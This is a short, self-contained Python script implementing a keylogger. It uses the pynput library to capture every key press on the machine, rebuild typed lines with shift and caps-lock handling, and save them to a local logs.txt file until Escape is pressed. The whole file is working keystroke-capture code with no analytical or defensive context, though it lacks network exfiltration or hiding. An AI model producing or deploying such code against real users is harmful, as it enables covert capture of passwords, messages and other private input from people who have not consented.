from pynput import keyboard

class KeyLogger:
    uppercase = False
    line = ""
    session = []
    
    def __init__(self) -> None:
      self.fs = open('./logs.txt', 'w+')
      try:
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
          self.listener.join()
          self.fs.close()
      except KeyboardInterrupt:
         self.save(all=True)
         self.fs.close()
         self.listener.join()
        
      


    def on_character_press(self, character):
      if self.uppercase:
         character = str(character).upper()
      self.line = self.line + character
      pass


    def save(self, all = False):
       
       self.session.append(self.line)
       self.line = ""

       if all or (len(self.session) > 3):
          text = ""
          for i in self.session:
             text += i + "\n"
          self.fs.write(text)
          self.session = []


    def on_special_key_pressed(self, key):
      if key == keyboard.Key.shift: 
          self.uppercase = not self.uppercase
      if key == keyboard.Key.enter:
         self.save()
      if key == keyboard.Key.caps_lock:
         self.uppercase = not self.uppercase
      pass


    def on_press(self, key):
      try:
          self.on_character_press(key.char)
      except AttributeError:
          self.on_special_key_pressed(key)


    def on_release(self, key):
      if key == keyboard.Key.esc:
          return False
      if key == keyboard.Key.shift:
         self.uppercase = not self.uppercase


if __name__ == '__main__':
   KeyLogger()